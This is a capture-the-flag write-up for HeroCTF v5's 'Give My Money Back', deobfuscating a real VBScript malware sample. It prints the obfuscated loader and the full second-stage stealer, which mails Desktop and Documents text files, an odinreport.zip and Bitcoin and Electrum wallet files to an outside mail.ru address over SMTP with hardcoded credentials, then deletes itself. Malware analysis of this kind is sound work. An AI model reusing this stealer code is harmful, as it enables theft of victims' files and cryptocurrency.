# Give My Money Back

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Find the flag](#find-the-flag)
4. [Deobfuscation](#deobfuscation)
5. [Conclusion](#conclusion)

## Overview

- 167 solves / 50 points
- Difficulty: Easy
- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

Joel sat at his desk, staring at the computer screen in front of her. She had just received a strange email from an unknown sender. Joel was intrigued. She hesitated for a moment, wondering if she should open the email or not. But her curiosity got the best of her, and she clicked on the message. Your goal is to help Joel find out who stole her money!  
  
**Warning : The attached archive contains real malware, do not run it on your machine!** Archive password: infected  
  
The flag corresponds to the email used for the exfiltration and the name of the last exfiltrated file, e.g. Hero{[attacker@evil.com](mailto:attacker@evil.com)|passwords.txt}.  
  
Format : **Hero{email|filename}**  
Author : **xanhacks**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HeroCTF-v5/images/Pasted%20image%2020230514160558.png)

## Find the flag

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/HeroCTF-v5/Reverse/Give-My-Money-Back/GiveMyMoneyBack.zip):**
```shell
┌[siunam♥earth]-(~/ctf/HeroCTF-v5/Reverse/Give-My-Money-Back)-[2023.05.14|16:06:12(HKT)]
└> file GiveMyMoneyBack.zip 
GiveMyMoneyBack.zip: Zip archive data, at least v2.0 to extract, compression method=AES Encrypted
```

**After extracted, we see this file:**
```shell
┌[siunam♥earth]-(~/ctf/HeroCTF-v5/Reverse/Give-My-Money-Back)-[2023.05.14|16:07:30(HKT)]
└> file edf576f75abda49a095ab28d8a822360387446ff3254544ae19c991a33125feb 
edf576f75abda49a095ab28d8a822360387446ff3254544ae19c991a33125feb: Microsoft Cabinet archive data, many, 15058 bytes, 2 files, at 0x2c last modified Sun, Oct 14 2022 20:24:26 +A "description.txt" last modified Sun, Dec 08 2022 01:49:26 +A "image.png.vbs", ID 2849, number 1, 9 datablocks, 0x1203 compression
```

**Microsoft Cabinet archive data?**

> A cabinet is a single file, usually with a `.cab` extension, that stores compressed files in a file library. The cabinet format is an efficient way to package multiple files because compression is performed across file boundaries, which significantly improves the compression ratio.

**Let's rename the extracted file:**
```shell
┌[siunam♥earth]-(~/ctf/HeroCTF-v5/Reverse/Give-My-Money-Back)-[2023.05.14|16:07:33(HKT)]
└> mv edf576f75abda49a095ab28d8a822360387446ff3254544ae19c991a33125feb stage1.cab
```

**To extract `.cab` file, we can use `cabextract`:**
```shell
┌[siunam♥earth]-(~/ctf/HeroCTF-v5/Reverse/Give-My-Money-Back)-[2023.05.14|16:09:26(HKT)]
└> cabextract stage1.cab
Extracting cabinet: stage1.cab
  extracting description.txt
  extracting image.png.vbs

All done, no errors.
```

**Nothing weird in `description.txt`:**
```shell
┌[siunam♥earth]-(~/ctf/HeroCTF-v5/Reverse/Give-My-Money-Back)-[2023.05.14|16:09:27(HKT)]
└> cat description.txt | uniq
sorry server is no longer available
sorry server is no longer available
```

## Deobfuscation

**However, in `image.png.vbs`, it's a VBScript:**
```vb
dIM jJkmPKZNvhSgPGmVLdvBVgOimreRTqiaEDiOcfNqy, AxEjAhgOVVhnXPrQQdPpAItXlqhuIRHOuDWWhvoyp, FwwcltIiESLKzggUCrjiaEUtjbmpvvGzwJNhoLFSp
Sub FncTqZirWltYCeayCzqdIRdKqrIzaKWRIZbSCprXS
JJKMpKZNvhsgPgMvldVBVGoiMRERTqiAEdIOcFNqY = "399711/3601*702350/6385*8573-8541*847693/8393*7119-7005*7714-7600*463-352*1137720/9980*214336/6698*-5139+5253*8037-7936*297045/2583*[...]*2065-2024"
axEjahGoVVhnxPRQQDPPaiTXLQhUIRhouDwwHvOyp = splIt(jjkMPKzNVhSgpGmvLdVBVGOimrerTQIaeDiocFNQY, chr(eVaL(75684/1802)))
for each MqNbrDAQjYRIwUnepBXnOsmlQlLuaaeTTwAchSFjz In AxEjahGovVHNxprqQdPPAITXLqhuiRHOuDwwhVOyP
FWwCltIiEsLkZgGUCRjiAEuTJbMpVVgZwJNhOLFSp = fwWCLtIieslKZgGUcrjIaEUTJBmPvvgZwjNHoLfSp & Chr(eVaL(MqnBrdaqjYRIwUnEPBxnoSMlqLluAaeTtwAchSFJz))
NEXT
lxtvaQuFKFKhmxjWgYFOSFuWJcYbTRdpUPuDAdnmD
end SUb
SUb LXTvAQufKFkHMxJwGYFOsFUwJcYBTRDPuPUdadnmD
eval(eXecUTe(fwwCltiieslkzggUCrJIaeUtjBmPvvGZwJNHoLFsp))
enD sUB
FnCtqZiRWLtyCeayCzQdIrDKqrIZAkwRIzBsCpRXs
```

Oh boi, it's obfuscated.

**Since this challenge's description said that this is a real malware, I'll deobfuscate it manually.**

**In line 1, it declares 3 variables:**
```vb
dIM jJkmPKZNvhSgPGmVLdvBVgOimreRTqiaEDiOcfNqy, AxEjAhgOVVhnXPrQQdPpAItXlqhuIRHOuDWWhvoyp, FwwcltIiESLKzggUCrjiaEUtjbmpvvGzwJNhoLFSp
```

**Then, in line 2 - 9, it has a function:**
```vb
Sub FncTqZirWltYCeayCzqdIRdKqrIzaKWRIZbSCprXS
JJKMpKZNvhsgPgMvldVBVGoiMRERTqiAEdIOcFNqY = "399711/3601*702350/6385*8573-8541*847693/8393*7119-7005*7714-7600*463-352*1137720/9980*214336/6698*-5139+5253*8037-7936*297045/2583*[...]*2065-2024"
axEjahGoVVhnxPRQQDPPaiTXLQhUIRhouDwwHvOyp = splIt(jjkMPKzNVhSgpGmvLdVBVGOimrerTQIaeDiocFNQY, chr(eVaL(75684/1802)))
for each MqNbrDAQjYRIwUnepBXnOsmlQlLuaaeTTwAchSFjz In AxEjahGovVHNxprqQdPPAITXLqhuiRHOuDwwhVOyP
FWwCltIiEsLkZgGUCRjiAEuTJbMpVVgZwJNhOLFSp = fwWCLtIieslKZgGUcrjIaEUTJBmPvvgZwjNHoLfSp & Chr(eVaL(MqnBrdaqjYRIwUnEPBxnoSMlqLluAaeTtwAchSFJz))
NEXT
lxtvaQuFKFKhmxjWgYFOSFuWJcYbTRdpUPuDAdnmD
end SUb
```

**We can rename the `JJKMpKZNvhsgPgMvldVBVGoiMRERTqiAEdIOcFNqY` variable to strings of numbers:**
```vb
dIM stringsOfNumbers, AxEjAhgOVVhnXPrQQdPpAItXlqhuIRHOuDWWhvoyp, FwwcltIiESLKzggUCrjiaEUtjbmpvvGzwJNhoLFSp
Sub FncTqZirWltYCeayCzqdIRdKqrIzaKWRIZbSCprXS
stringsOfNumbers = "399711/3601*702350/6385*8573-8541*847693/8393*7119-7005*7714-7600*463-352*1137720/9980*214336/6698*-5139+5253*8037-7936*297045/2583*[...]*2065-2024"
axEjahGoVVhnxPRQQDPPaiTXLQhUIRhouDwwHvOyp = splIt(stringsOfNumbers, chr(eVaL(75684/1802)))
for each MqNbrDAQjYRIwUnepBXnOsmlQlLuaaeTTwAchSFjz In AxEjahGovVHNxprqQdPPAITXLqhuiRHOuDwwhVOyP
FWwCltIiEsLkZgGUCRjiAEuTJbMpVVgZwJNhOLFSp = fwWCLtIieslKZgGUcrjIaEUTJBmPvvgZwjNHoLfSp & Chr(eVaL(MqnBrdaqjYRIwUnEPBxnoSMlqLluAaeTtwAchSFJz))
NEXT
lxtvaQuFKFKhmxjWgYFOSFuWJcYbTRdpUPuDAdnmD
end SUb
```

**Next, we can see that the `axEjahGoVVhnxPRQQDPPaiTXLQhUIRhouDwwHvOyp` variable is spliting the `stringsOfNumbers` with delimiter `*` (`chr(eVaL(75684/1802))` = `*`). So, let's rename it!**
```vb
dIM stringsOfNumbers, splitedStringsOfNumbers, FwwcltIiESLKzggUCrjiaEUtjbmpvvGzwJNhoLFSp
Sub FncTqZirWltYCeayCzqdIRdKqrIzaKWRIZbSCprXS
stringsOfNumbers = "399711/3601*702350/6385*8573-8541*847693/8393*7119-7005*7714-7600*463-352*1137720/9980*214336/6698*-5139+5253*8037-7936*297045/2583*[...]*2065-2024"
splitedStringsOfNumbers = splIt(stringsOfNumbers, "*")
for each MqNbrDAQjYRIwUnepBXnOsmlQlLuaaeTTwAchSFjz In splitedStringsOfNumbers
FWwCltIiEsLkZgGUCRjiAEuTJbMpVVgZwJNhOLFSp = fwWCLtIieslKZgGUcrjIaEUTJBmPvvgZwjNHoLfSp & Chr(eVaL(MqnBrdaqjYRIwUnEPBxnoSMlqLluAaeTtwAchSFJz))
NEXT
lxtvaQuFKFKhmxjWgYFOSFuWJcYbTRdpUPuDAdnmD
end SUb
```

After splited, it'll loop through every index in the `splitedStringsOfNumbers` array, which will again convert those numbers to a character.

**Hence, we can rename those variables!**
```vb
dIM stringsOfNumbers, splitedStringsOfNumbers, evaledStringsOfNumbers
Sub FncTqZirWltYCeayCzqdIRdKqrIzaKWRIZbSCprXS
stringsOfNumbers = "399711/3601*702350/6385*8573-8541*847693/8393*7119-7005*7714-7600*463-352*1137720/9980*214336/6698*-5139+5253*8037-7936*297045/2583*[...]*2065-2024"
splitedStringsOfNumbers = splIt(stringsOfNumbers, "*")
for each number In splitedStringsOfNumbers
evaledStringsOfNumbers = evaledStringsOfNumbers & Chr(eVaL(number))
NEXT
lxtvaQuFKFKhmxjWgYFOSFuWJcYbTRdpUPuDAdnmD
end SUb
```

It's much more clear now!

**After that for loop, it'll invoke function `lxtvaQuFKFKhmxjWgYFOSFuWJcYbTRdpUPuDAdnmD`:**
```vb
SUb LXTvAQufKFkHMxJwGYFOsFUwJcYBTRDPuPUdadnmD
eval(eXecUTe(evaledStringsOfNumbers))
enD sUB
```

**Which executes the payload. (DO NOT RUN THIS EVAL)**

**So, after all the renames, the deobfucasted VBScript is this:**
```vb
dIM stringsOfNumbers, splitedStringsOfNumbers, evaledStringsOfNumbers
Sub functionSplitStringsOfNumbers
stringsOfNumbers = "399711/3601*702350/6385*8573-8541*847693/8393*7119-7005*7714-7600*463-352*1137720/9980*214336/6698*-5139+5253*8037-7936*297045/2583*[...]*2065-2024"
splitedStringsOfNumbers = splIt(stringsOfNumbers, "*")
for each number In splitedStringsOfNumbers
evaledStringsOfNumbers = evaledStringsOfNumbers & Chr(eVaL(number))
NEXT
evalPayload
end SUb
SUb evalPayload
eval(eXecUTe(evaledStringsOfNumbers))
enD sUB
functionSplitStringsOfNumbers
```

**Now, we can convert the above script to Python:**
```python
#!/usr/bin/env python3

def functionSplitStringsOfNumbers():
    global evaledStringsOfNumbers
    evaledStringsOfNumbers = ''
    stringsOfNumbers = '399711/3601*702350/6385*8573-8541*847693/8393*7119-7005*7714-[...]*2065-2024'
    splitedStringsOfNumbers = stringsOfNumbers.split('*')
    for number in splitedStringsOfNumbers:
        evaledStringsOfNumbers += chr(int(eval(number)))

    evalPayload()

def evalPayload():
    # DO NOT RUN THE EVAL
    # eval(evaledStringsOfNumbers)
    with open('stage2.vbs', 'w') as file:
        file.write(evaledStringsOfNumbers)

if __name__ == '__main__':
    functionSplitStringsOfNumbers()
```

**Let's run that Python script! It should return the second stage payload!**
```shell
┌[siunam♥earth]-(~/ctf/HeroCTF-v5/Reverse/Give-My-Money-Back)-[2023.05.14|16:23:19(HKT)]
└> python3 deobfuscate_stage1.py 
┌[siunam♥earth]-(~/ctf/HeroCTF-v5/Reverse/Give-My-Money-Back)-[2023.05.14|16:23:25(HKT)]
└> file stage2.vbs                                                      
stage2.vbs: ASCII text
```

**`stage2.vbs`:**
```vb
on error resume next
Const Desktop = 4
Const MyDocuments = 16
Set S = CreateObject("Wscript.Shell") 

Set FSO = CreateObject("scripting.filesystemobject")
WScript.Sleep(1000 * 30)







strSMTP_Server = "smtp.mail.ru"
strTo = "bmwqia84@mail.ru"
strFrom = "bmwqia84@mail.ru"
strSubject = "AIRDROP"
strBody = "LOG"








Set iMsg=CreateObject("CDO.Message") 

Set iConf=CreateObject("CDO.Configuration")

Set wshShell = CreateObject( "WScript.Shell" )
strUserName = wshShell.ExpandEnvironmentStrings( "%USERNAME%" )
Set Flds=iConf.Fields 
Flds.Item("http://schemas.microsoft.com/cdo/configuration/smtpserver") = "smtp.mail.ru"
Flds.Item("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = 465
Flds.Item("http://schemas.microsoft.com/cdo/configuration/sendusing")    = 2  
Flds.Item("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate") = 1  
Flds.Item("http://schemas.microsoft.com/cdo/configuration/smtpusessl")      = true 
Flds.Item("http://schemas.microsoft.com/cdo/configuration/sendusername")    = "bmwqia84@mail.ru"
Flds.Item("http://schemas.microsoft.com/cdo/configuration/sendpassword")    = "R4CMZ3rVnMFtzz6vzRi1" 



Flds.Update 
iMsg.Configuration=iConf 
iMsg.To=strTo 


iMsg.From=strFrom 
iMsg.Subject=strSubject 

iMsg.TextBody=strBody 
Set fld = FSO.GetFolder(S.SpecialFolders(Desktop))
For each file in fld.files
    if LCase(FSO.GetExtensionName(file)) = "txt" Then
        iMsg.AddAttachment file.path
	
    End if
Next







Flds.Update 
iMsg.Configuration=iConf 
iMsg.To=strTo 

iMsg.From=strFrom 
iMsg.Subject=strSubject 
iMsg.TextBody=strBody 

Set fld = FSO.GetFolder(S.SpecialFolders(MyDocuments))
For each file in fld.files
    if LCase(FSO.GetExtensionName(file)) = "txt" Then
        iMsg.AddAttachment file.path
	
    End if
Next
iMsg.AddAttachment "C:\Users\" & strUserName & "\AppData\Local\odin\odinreport.zip"
iMsg.AddAttachment "A:\Users\" & strUserName & "\AppData\Local\odin\odinreport.zip"
iMsg.AddAttachment "B:\Users\" & strUserName & "\AppData\Local\odin\odinreport.zip"
iMsg.AddAttachment "D:\Users\" & strUserName & "\AppData\Local\odin\odinreport.zip"
iMsg.AddAttachment "C:\Users\" & strUserName & "\AppData\Roaming\Bitcoin\wallet.dat"
iMsg.AddAttachment "C:\Users\" & strUserName & "\AppData\Roaming\Electrum\wallets\default_wallet"
iMsg.Send



Set mFSO = CreateObject("Scripting.FileSystemObject")

Call mFSO.DeleteFile(WScript.ScriptFullName, True)
```

As you can see, this malware is an information stealer malware, as **it's exfiltrating `odinreport.zip`, crypto wallets like Bitcoin's `wallet.dat`, Electrum's `default_wallet`.**

**Also, in this stage 2 payload, it's adding those attachments to an email, and send to email address `bmwqia84@mail.ru`.**

- **Flag: `Hero{bmwqia84@mail.ru|default_wallet}`**

## Conclusion

What we've learned:

1. Manually Deobfuscating VBScript Code